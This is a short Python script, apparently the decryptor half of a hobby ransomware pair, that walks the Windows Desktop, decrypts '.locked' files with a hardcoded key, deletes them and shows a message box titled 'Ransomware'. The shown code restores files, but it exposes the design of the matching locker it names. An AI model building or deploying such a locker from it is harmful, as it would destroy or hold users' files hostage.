import os
from cryptography.fernet import Fernet
import ctypes  # For showing a message box

# Hardcoded encryption key (must match the key in lock_files.py)
KEY = b's8tdnp2xv_rhK39GAStQsp_sKS534UcfUmeZa0IKhTQ='  # Use the generated key
cipher_suite = Fernet(KEY)  # Use the same key for decryption

# Function to decrypt files
def unlock_files():
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    
    for root, dirs, files in os.walk(desktop_path):
        for file in files:
            # Skip the lock and unlock scripts to avoid locking them
            if file == "lock_files.py" or file == "unlock_files.py":
                print(f"[!] Skipping file: {file}")
                continue

            if file.endswith(".locked"):
                file_path = os.path.join(root, file)
                unlocked_path = file_path[:-7]  # Remove ".locked" suffix

                try:
                    # Read the encrypted file content
                    with open(file_path, "rb") as f:
                        encrypted_data = f.read()

                    # Decrypt the file content
                    decrypted_data = cipher_suite.decrypt(encrypted_data)

                    # Write the decrypted data to the original file
                    with open(unlocked_path, "wb") as f:
                        f.write(decrypted_data)

                    # Delete the locked file
                    os.remove(file_path)
                    print(f"[+] Unlocked and deleted: {file_path}")

                except Exception as e:
                    print(f"[-] Failed to unlock or delete {file_path}: {e}")

    # Show a message box
    ctypes.windll.user32.MessageBoxW(0, "All files on your Desktop have been unlocked and .locked files deleted!", "Ransomware ", 1)

# Automatically unlock files on execution
if __name__ == "__main__":
    unlock_files()